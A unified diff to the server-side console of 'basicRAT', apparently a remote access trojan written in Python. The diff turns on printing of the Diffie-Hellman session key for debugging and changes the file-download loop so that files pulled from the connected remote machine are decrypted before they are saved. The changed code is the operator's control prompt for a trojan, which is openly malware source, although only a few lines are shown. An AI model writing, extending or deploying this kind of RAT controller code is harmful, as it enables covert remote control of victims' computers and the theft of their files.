@@ -4,6 +4,7 @@
 import readline
 import time
 import struct
+import binascii
 from basicRAT import *
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
@@ -48,7 +49,7 @@ def main():
     s.listen(10)
     conn, addr = s.accept()
     DHKEY = diffiehellman(conn, server=True)
-    #print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
+    print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
     
     while True:
         prompt = raw_input('[{0}] basicRAT> '.format(addr[0])).rstrip()
@@ -87,7 +88,7 @@ def main():
                     datasize = struct.unpack("!I", conn.recv(4))[0]
                     while datasize:
                         res = conn.recv(datasize)
-                        f.write(res)
+                        f.write(decrypt(res, DHKEY))
                         datasize = struct.unpack("!I", conn.recv(4))[0]
                    
                     
